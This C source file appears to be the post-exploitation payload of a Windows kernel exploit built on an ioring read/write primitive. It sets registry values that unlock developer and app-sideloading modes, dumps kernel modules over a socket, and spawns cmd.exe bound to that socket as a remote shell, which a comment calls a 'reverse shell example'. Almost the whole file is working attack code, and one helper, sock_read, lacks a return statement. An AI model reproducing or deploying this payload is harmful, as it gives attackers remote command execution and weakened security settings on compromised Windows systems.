#include "post_exploit.h"
#include "win_defs.h"
#include "ioring.h"
#include "util.h"
#include "krnl_dumper.h"

#include <stdio.h>
#include <Windows.h>
#include <lmcons.h>
#include <metahost.h>
#include <ntstatus.h>
#include <inttypes.h>
#include "nt_offsets.h"
#pragma comment(lib, "mscoree.lib")



char* sock_read(SOCKET sock) {
    char msg[1024] = { 0 };
    recv(sock, msg, 1024, MSG_PEEK);
}

void spawn_cmd(SOCKET sock) {
    // Spawn CMD using the socket for input and output
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, "S:\\", &sinfo, &pinfo);
    while (1) {}
}

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Put your own code in here!
// Provided is a simple reverse shell example
void post_exploit(SOCKET sock, UINT64 ntBase)
{
    CHAR msg[1024] = { 0 };

    sock_log(sock, "-hpayload\n");
    
    int data = 1;
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"OSDATA\\Software\\Microsoft\\SecurityManager",
        L"InternalDevUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] InternalDevUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppModelUnlock",
        L"AppModelUnlock",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AppModelUnlock enabled.\n");
    if (!RegSetKeyValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\Appx",
        L"AllowDevelopmentWithoutDevLicense",
        4u,
        &data,
        4u))
        sock_log(sock, "[?] AllowDevelopmentWithoutDevLicense enabled.\n");
    
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;

    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdError = (HANDLE)sock;
    sinfo.hStdInput = (HANDLE)sock;
    sinfo.hStdOutput = (HANDLE)sock;

    CHAR ptr_msg[1024] = { 0 };

    dump_kmodules(sock);
   
    // kernel rw no longer needed, so do some laundry
    ioring_cleanup();

    spawn_cmd(sock);
    while (1) {}
    
}
